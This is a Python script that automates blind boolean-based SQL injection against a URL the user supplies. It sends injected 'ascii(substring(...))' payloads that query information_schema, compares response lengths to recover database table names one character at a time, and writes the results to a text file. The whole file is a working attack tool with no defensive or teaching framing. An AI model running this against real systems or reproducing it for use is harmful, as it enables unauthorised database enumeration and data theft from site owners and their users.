# imports
from colorama.ansi import Fore
import requests, urllib3, time, os
from colorama import Fore

def start(url_input):

    # Disable Warnings
    urllib3.disable_warnings()

    # Get Wrong Output
    test_url = f"{url_input}' and ascii(substring((select table_name from information_schema.columns where column_name like 0x2570617325 limit 0,1),0,1))=1000--+"
    false_result = requests.get(test_url, verify=False).content
    false_Length = len(false_result)

    # Important Inputs
    table_string = input(' ---------\n Enter The Table You Want Find Like That : ')

    # Hex The Table
    table_string_encode = f'%{table_string}%'.encode('UTF-8').hex()
    hexed_table = f'0x{table_string_encode}'

    # Attack Loop
    table = []
    for j in range(0, int(50)):
        print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{j}] Table"+Fore.RESET)
        i = 0

        # Word Finder Loop
        for i in range(1, 15):
            print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{i}] START\n"+Fore.RESET+' --------')
            flag = False

            # Ascci Finder Loop
            for a in range(60, 127):
                url = f"{url_input}' and ascii(substring((select table_name from information_schema.columns where column_name like {hexed_table} limit {j},1),{i},1))={a}--+"
                result = requests.get(url, verify=False).content
                print (f' {a} | False')

                # Loop Checker Condition
                if len(result) != false_Length:
                    flag = True
                    print (Fore.LIGHTGREEN_EX+f"\n Character Found! --> [{a}] | [{chr(a)}]\n"+Fore.RESET)
                    table.append(chr(a))
                    time.sleep(2)
                    break

            # Loop Checker Condition
            if flag == False:
                print (Fore.RED+"\n Finish!"+Fore.RESET)
                break
        
        # Print Result
        print(Fore.LIGHTGREEN_EX+'\n Result --> '+Fore.RESET, end='')
        empty = ''
        table_name = empty.join(table)
        print (Fore.LIGHTGREEN_EX+f'{table_name}'+Fore.RESET)

        # Save Result in a txt file
        with open('Tables_Like.txt', 'a+') as tt:
            tt.write(f'{table_name}\n')

        # clear list for next table
        table.clear()
        print('\n')